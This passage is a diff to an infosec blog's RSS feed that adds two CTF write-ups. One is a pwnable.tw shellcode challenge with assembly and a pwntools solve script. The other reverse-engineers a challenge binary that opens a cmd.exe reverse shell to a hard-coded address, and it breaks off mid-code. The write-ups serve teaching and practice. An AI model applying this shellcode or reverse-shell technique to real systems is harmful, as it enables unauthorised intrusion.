@@ -6,17 +6,264 @@
     <description>Recent content on Yet, another infosec blog</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>en-us</language>
-    <lastBuildDate>Thu, 13 Jan 2022 09:30:00 +1345</lastBuildDate><atom:link href="https://legiahuyy.github.io/blog/en/index.xml" rel="self" type="application/rss+xml" />
+    <lastBuildDate>Sat, 07 May 2022 09:30:00 +1345</lastBuildDate><atom:link href="https://legiahuyy.github.io/blog/en/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Pwnable.tw - orw [KCSC]</title>
+      <link>https://legiahuyy.github.io/blog/en/posts/kcsc-pwn-orw/</link>
+      <pubDate>Sat, 07 May 2022 09:30:00 +1345</pubDate>
+      
+      <guid>https://legiahuyy.github.io/blog/en/posts/kcsc-pwn-orw/</guid>
+      <description>&lt;p&gt;Let&amp;rsquo;s have a quick and succinct write-up for &lt;strong&gt;orw&lt;/strong&gt; - a challenge at &lt;a href=&#34;&#34;&gt;pwnable.tw&lt;/a&gt;.&lt;/p&gt;</description>
+      <content>&lt;p&gt;Let&amp;rsquo;s have a quick and succinct write-up for &lt;strong&gt;orw&lt;/strong&gt; - a challenge at &lt;a href=&#34;&#34;&gt;pwnable.tw&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/legiahuyy/image-host/main/2022-06-05-kcsc-pwn-orw/2022-05-06_20-07.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;h2 id=&#34;footprinting&#34;&gt;Footprinting&lt;/h2&gt;
+&lt;p&gt;Initially, we want to check the file for any notable properties (PIE, Canary, RELRO, etc.).&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/legiahuyy/image-host/main/2022-06-05-kcsc-pwn-orw/2022-05-06_21-24.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Based on the output above, there are no protection bits enabled within the binary (except for canary but it does not interfere with our payload afterwards) and therefore it is presumably believed to be quite simple as expected for a 100pts challenge.&lt;/p&gt;
+&lt;p&gt;For now, we shall have a look into the disassembly code of &lt;code&gt;orw&lt;/code&gt;:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/legiahuyy/image-host/main/2022-06-05-kcsc-pwn-orw/2022-05-06_21-33.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;What the program does is rather straightforward, as it:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;calls &lt;code&gt;orw_seccomp&lt;/code&gt; which basically allows only &lt;code&gt;SYS_open&lt;/code&gt;, &lt;code&gt;SYS_read&lt;/code&gt; and &lt;code&gt;SYS_write&lt;/code&gt; to be executed thus limited our capability of calling low hanging fruit syscalls like &lt;code&gt;execve&lt;/code&gt;, &lt;code&gt;system&lt;/code&gt; or such&lt;/li&gt;
+&lt;li&gt;reads input from STDIN (&lt;code&gt;SYS_read&lt;/code&gt; with 200 bytes limit) and executes whatever it is as shellcode&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;That being said, the author simply asks us to practice writing assembly and interacting with given syscalls.&lt;/p&gt;
+&lt;h2 id=&#34;solution&#34;&gt;Solution&lt;/h2&gt;
+&lt;p&gt;According to what we have discussed, our shellcode needs to call &lt;code&gt;SYS_open&lt;/code&gt; to open the flag at &lt;code&gt;/home/orw/flag&lt;/code&gt;, then reads the content therein with &lt;code&gt;SYS_read&lt;/code&gt; and finally pipe it to STDOUT using &lt;code&gt;SYS_write&lt;/code&gt;. Keep in mind that syscalls have their own dedicated &lt;em&gt;ID&lt;/em&gt;, herein &lt;code&gt;0x5&lt;/code&gt;, &lt;code&gt;0x3&lt;/code&gt;, &lt;code&gt;0x4&lt;/code&gt; for &lt;code&gt;open&lt;/code&gt;, &lt;code&gt;read&lt;/code&gt; and &lt;code&gt;write&lt;/code&gt;, respectively.&lt;/p&gt;
+&lt;p&gt;You can read more about Linux syscalls and their respective assembly &lt;a href=&#34;https://www.tutorialspoint.com/assembly_programming/assembly_system_calls.htm&#34;&gt;here&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/legiahuyy/image-host/main/2022-06-05-kcsc-pwn-orw/2022-05-06_22-03.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;To call a syscall, simply push its ID into &lt;code&gt;EAX&lt;/code&gt; then ask &lt;code&gt;INT&lt;/code&gt; to execute it.&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-assembly&#34; data-lang=&#34;assembly&#34;&gt;mov eax, 0x1	; 0x1 - SYS_exit
+int 0x80		; call it
+&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;sys_open---0x5&#34;&gt;SYS_open - 0x5&lt;/h3&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;open&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;pathname, &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; flags, mode_t mode);
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;As demonstrated in the table and the syntax listed, &lt;code&gt;SYS_open&lt;/code&gt; takes &lt;code&gt;ebx&lt;/code&gt; as its filename, &lt;code&gt;ecx&lt;/code&gt; as open access mode and &lt;code&gt;edx&lt;/code&gt; as file permission. We thus need:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;EBX&lt;/code&gt; holds the value of &lt;code&gt;/home/orw/flag&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;ECX&lt;/code&gt; could be &lt;code&gt;0&lt;/code&gt; (&lt;code&gt;O_RDONLY&lt;/code&gt; flag)&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;EDX&lt;/code&gt; is not necessary since it is a optional argument, we should leave it as &lt;code&gt;0&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Our shellcode for this syscall shall as follows:&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-assembly&#34; data-lang=&#34;assembly&#34;&gt;push 0x6761		; ag
+push 0x6c662f77 ; w/fl
+push 0x726f2f65	; e/or
+push 0x6d6f682f	; /hom
+mov ebx, esp	; ESP now has the path /home/orw/flag
+xor ecx, ecx	; O_RDONLY
+xor edx, edx	; NULL
+mov eax, 0x5 	; SYS_open(ebp, ecx, edx)
+int 0x80
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Note:&lt;/strong&gt; It is not feasible to push the whole string &lt;code&gt;/home/orw/flag&lt;/code&gt; but a 8-byte value onto the stack at once since the program is speaking x32 and that is the reason why we have to divide the string into four separate parts. Follow &lt;a href=&#34;https://c9x.me/x86/html/file_module_x86_id_269.html&#34;&gt;this link&lt;/a&gt; for more information about PUSH instruction.&lt;/p&gt;
+&lt;p&gt;You can convert the string in reverse using this recipe in &lt;a href=&#34;https://gchq.github.io/CyberChef/#recipe=Reverse(&#39;Character&#39;)To_Hex(&#39;None&#39;,8)&amp;amp;input=L2hvbQ&#34;&gt;CyberChef&lt;/a&gt;:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/legiahuyy/image-host/main/2022-06-05-kcsc-pwn-orw/2022-05-07_09-21.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;h3 id=&#34;sys_read---0x3&#34;&gt;SYS_read - 0x3&lt;/h3&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;ssize_t &lt;span style=&#34;color:#a6e22e&#34;&gt;read&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; fd, &lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;buf, size_t count);
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Follows the table and &lt;code&gt;read&lt;/code&gt;&amp;rsquo;s syntax:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;EBX&lt;/code&gt; is now our file handle returned from &lt;code&gt;SYS_open&lt;/code&gt; and stored in &lt;code&gt;EAX&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;ECX&lt;/code&gt; holds the buffer for the flag, it could point to any string register dubbed &lt;code&gt;ESI&lt;/code&gt;, &lt;code&gt;EDI&lt;/code&gt; or even &lt;code&gt;ESP&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;EDX&lt;/code&gt; is the maximum bytes our buffer shall have, &lt;code&gt;0x50&lt;/code&gt; should be enough for the flag&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;And we have the shellcode for &lt;code&gt;SYS_read&lt;/code&gt;:&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-assembly&#34; data-lang=&#34;assembly&#34;&gt;; ...
+mov ebx, eax	; eax has the handle of our file
+mov ecx, esp	; ecx now points to esp and uses it as the buffer
+mov edx, 0x50	; ... of 0x50 bytes in size
+mov eax, 0x3	; SYS_read(ebx, ecx, edx)
+int 0x80			
+&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;sys_write---0x4&#34;&gt;SYS_write - 0x4&lt;/h3&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;ssize_t &lt;span style=&#34;color:#a6e22e&#34;&gt;write&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; fd, &lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;buf, size_t count);
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Same with those two above, we adhere to the table and its syntax:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;EBX&lt;/code&gt; is file descriptor which indicates where the program would write and the register&amp;rsquo;s value should be &lt;code&gt;1&lt;/code&gt; - pipe directly to STDOUT&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;ECX&lt;/code&gt; needs to point to our flag and it is currently in &lt;code&gt;ESP&lt;/code&gt; so we shall have it as that&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;EDX&lt;/code&gt; is the number of bytes to be written which returned from &lt;code&gt;SYS_read&lt;/code&gt;, therefore it should be &lt;code&gt;EDX -&amp;gt; EAX&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Our shellcode:&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-assembly&#34; data-lang=&#34;assembly&#34;&gt;; ...
+mov edx, eax	; byte_written = eax
+mov ebx, 0x1	; stdout
+mov ecx, esp	; flag&#39;s buffer
+mov eax, 0x4	; SYS_write
+int 0x80
+&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;solvepy&#34;&gt;Solve.py&lt;/h2&gt;
+&lt;p&gt;In this final step, gather them all in one place - &lt;code&gt;solve.py&lt;/code&gt;:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#!/usr/bin/env python3&lt;/span&gt;
+&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; pwn &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;
+
+elf &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; context&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;binary &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ELF(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;./orw&amp;#39;&lt;/span&gt;)
+&lt;span style=&#34;color:#75715e&#34;&gt;#p = process([elf.path])&lt;/span&gt;
+p &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; remote(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;chall.pwnable.tw&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;10001&lt;/span&gt;)
+
+payload &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; asm(
+    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&amp;#39;
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;        push 0x6761
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;        push 0x6c662f77
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;        push 0x726f2f65
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;        push 0x6d6f682f
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;        mov ebx, esp
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;        xor ecx, ecx
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;        xor edx, edx
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;        mov eax, 0x5
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;        int 0x80
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;        mov ebx, eax
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;        mov ecx, esp
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;        mov edx, 0x50
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;        mov eax, 0x3
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;        int 0x80
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;        mov ecx, esp
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;        mov edx, eax
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;        mov ebx, 0x1
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;        mov eax, 0x4
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;        int 0x80
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;        push 0x1
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;        pop eax
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;        int 0x80
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    &amp;#39;&amp;#39;&amp;#39;&lt;/span&gt;
+)
+
+print(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Payload size: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;len(payload)&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)  &lt;span style=&#34;color:#75715e&#34;&gt;# just to make sure our payload won&amp;#39;t exceed 200 bytes limit&lt;/span&gt;
+p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendline(payload)
+p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;interactive()
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The script shows that our payload has the size of 70 bytes and we have the flag subsequently. It is still worth mentioning that we can reduce the size of the payload by replacing &lt;code&gt;mov&lt;/code&gt;  with &lt;code&gt;push; pop&lt;/code&gt; instruction since the latter two only consist of 3 bytes in total whereas &lt;code&gt;mov&lt;/code&gt; is of 5-bytes itself.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/legiahuyy/image-host/main/2022-06-05-kcsc-pwn-orw/2022-05-07_09-28.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;</content>
+    </item>
+    
+    <item>
+      <title>KCSC CTF 2022: secret [RE]</title>
+      <link>https://legiahuyy.github.io/blog/en/posts/kcsc-ctf-2022-re-secret/</link>
+      <pubDate>Fri, 29 Apr 2022 09:30:00 +1345</pubDate>
+      
+      <guid>https://legiahuyy.github.io/blog/en/posts/kcsc-ctf-2022-re-secret/</guid>
+      <description>&lt;p&gt;This post is a write-up for the challenge &amp;ldquo;secret&amp;rdquo; from KCSC-CTF 2022 which I just participated on Sunday, last week. The challenge seems to be a mixed of miscellaneous and reverse expertise as it requires us to analyze both a network PCAP file and an executable in order to obtain the flag.&lt;/p&gt;</description>
+      <content>&lt;p&gt;This post is a write-up for the challenge &amp;ldquo;secret&amp;rdquo; from KCSC-CTF 2022 which I just participated on Sunday, last week. The challenge seems to be a mixed of miscellaneous and reverse expertise as it requires us to analyze both a network PCAP file and an executable in order to obtain the flag.&lt;/p&gt;
+&lt;p&gt;You can download the challenge &lt;a href=&#34;https://github.com/legiahuyy/dropper/blob/main/kcsc-ctf-2022/re/secret.zip&#34;&gt;here&lt;/a&gt;.&lt;/p&gt;
+&lt;h2 id=&#34;footprinting&#34;&gt;Footprinting&lt;/h2&gt;
+&lt;p&gt;The target&amp;rsquo;s directory contains two following files, &lt;code&gt;capture.pcapng&lt;/code&gt; and &lt;code&gt;secret.exe&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;D:/Development/github/repos/image-host/2022-04-30-kcscctf2022-secret/2022-04-30_20-29.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;h3 id=&#34;secretexe&#34;&gt;secret.exe&lt;/h3&gt;
+&lt;p&gt;Fortunately, the result provided from ExeinfoPE shows that the binary file is not packed and, presumably, obfuscated by any third-parties. Yet, keep in mind that almost every reversing challenge usually has its own implementation of code obfuscation or data encryption, which we need to solve later.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;D:/Development/github/repos/image-host/2022-04-30-kcscctf2022-secret/2022-04-30_20-39.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Based on the result, we can tell there is also no hidden executable in the original one so it is not necessary to scan and dump &lt;code&gt;secret.exe&lt;/code&gt;&amp;rsquo;s resource.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;D:/Development/github/repos/image-host/2022-04-30-kcscctf2022-secret/2022-04-30_20-54.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;h3 id=&#34;capturepcapng&#34;&gt;capture.pcapng&lt;/h3&gt;
+&lt;p&gt;The pcapng file has no unusual characteristics or properties, it shows us the conversation between &lt;code&gt;192.168.123.111&lt;/code&gt; and &lt;code&gt;192.168.123.123&lt;/code&gt; and based on the context, the host with the fourth octet &lt;code&gt;111&lt;/code&gt; is sending assumingly encrypted data to the other one.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;D:/Development/github/repos/image-host/2022-04-30-kcscctf2022-secret/2022-04-30_21-02.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;h2 id=&#34;reversing&#34;&gt;Reversing&lt;/h2&gt;
+&lt;p&gt;Examine the binary with IDA, pseudo code of its &lt;code&gt;main&lt;/code&gt; function as follows:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;D:/Development/github/repos/image-host/2022-04-30-kcscctf2022-secret/2022-04-30_21-53.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;As demonstrated, this is apparently an initialization for a WinSock connection using those familiar API calls like &lt;code&gt;WSAStartup&lt;/code&gt;, &lt;code&gt;htons&lt;/code&gt;, &lt;code&gt;inet_addr&lt;/code&gt;, &amp;hellip; straight from the book.&lt;/p&gt;
+&lt;p&gt;The function does:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;Create a singleton mutex object with default namespace as &lt;code&gt;9_5_diem&lt;/code&gt;, not that important&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Initialize &lt;code&gt;sockaddr_in&lt;/code&gt; struct as:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c++&#34; data-lang=&#34;c++&#34;&gt;sockaddr_in.sin_family &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;// AF_INET
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;sockaddr_in.sin_addr.s_addr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; inet_addr(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;192.168.123.123&amp;#34;&lt;/span&gt;)
+sockaddr_in.sin_port &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; htons(&lt;span style=&#34;color:#ae81ff&#34;&gt;1337&lt;/span&gt;) &lt;span style=&#34;color:#75715e&#34;&gt;// 0x593
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;and then call &lt;code&gt;socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)&lt;/code&gt; with address family specification as IPv4, socket type as byte stream and protocol as TCP, respectively&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Establish the connection using &lt;code&gt;connect&lt;/code&gt; with the aforementioned struct as parameter&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Call &lt;code&gt;sub_401983&lt;/code&gt; and release the mutex then finally exit.&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Nothing much of an interest until we jump into &lt;code&gt;sub_401983&lt;/code&gt; which actually does something less mundane:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;D:/Development/github/repos/image-host/2022-04-30-kcscctf2022-secret/2022-04-30_22-34.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;In detail, &lt;code&gt;sub_401983&lt;/code&gt; does:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;Create two sections of shared memory (called &lt;strong&gt;pipes&lt;/strong&gt;) that it would later use for communication, and &lt;code&gt;SetHandleInformation&lt;/code&gt; is to ensure the memory regions is not inherited.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Initialize &lt;code&gt;ProcessInformation&lt;/code&gt; and &lt;code&gt;StartupInfo&lt;/code&gt; to redirect STDIN and STDOUT to the above regions&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Call &lt;code&gt;cmd.exe&lt;/code&gt; via &lt;code&gt;CreateProcessW&lt;/code&gt; then execute &lt;code&gt;StartAddress&lt;/code&gt; and &lt;code&gt;sub_4018B3&lt;/code&gt; simultaneously&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;code&gt;cmd.exe&lt;/code&gt; should receive inputs from the pipes, execute them and redirect its STDOUT/STDERR to the pipes&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Wait indefinitely (&lt;code&gt;WaitForSingleObject&lt;/code&gt;) for &lt;code&gt;cmd.exe&lt;/code&gt; to exit and return&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;In simple term, the function basically creates anonymous &lt;em&gt;pipes&lt;/em&gt; for both STDIN and STDOUT, it then calls &lt;code&gt;cmd.exe&lt;/code&gt; and creates a thread pool consists of &lt;code&gt;StartAddress&lt;/code&gt; and &lt;code&gt;sub_4018B3&lt;/code&gt;, waits for them and exits eventually.&lt;/p&gt;
+&lt;p&gt;Next, we would want to have a look at &lt;code&gt;StartAddress&lt;/code&gt;&amp;rsquo;s pseudo C:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;__stdcall&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;StartAddress&lt;/span&gt;()
+{
+  &lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;v0; &lt;span style=&#34;color:#75715e&#34;&gt;// ebx
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  size_t v1; &lt;span style=&#34;color:#75715e&#34;&gt;// ebx
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  size_t v2; &lt;span style=&#34;color:#75715e&#34;&gt;// esi
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  _DWORD &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;v3; &lt;span style=&#34;color:#75715e&#34;&gt;// edi
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;v4; &lt;span style=&#34;color:#75715e&#34;&gt;// ST0C_4
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; result; &lt;span style=&#34;color:#75715e&#34;&gt;// eax
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;buf; &lt;span style=&#34;color:#75715e&#34;&gt;// [esp+10h] [ebp-60h]
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;i; &lt;span style=&#34;color:#75715e&#34;&gt;// [esp+14h] [ebp-5Ch]
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; v8; &lt;span style=&#34;color:#75715e&#34;&gt;// [esp+18h] [ebp-58h]
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; v9; &lt;span style=&#34;color:#75715e&#34;&gt;// [esp+1Ch] [ebp-54h]
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; v10; &lt;span style=&#34;color:#75715e&#34;&gt;// [esp+20h] [ebp-50h]
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; v11; &lt;span style=&#34;color:#75715e&#34;&gt;// [esp+24h] [ebp-4Ch]
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; v12; &lt;span style=&#34;color:#75715e&#34;&gt;// [esp+28h] [ebp-48h]
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; v13; &lt;span style=&#34;color:#75715e&#34;&gt;// [esp+2Ch] [ebp-44h]
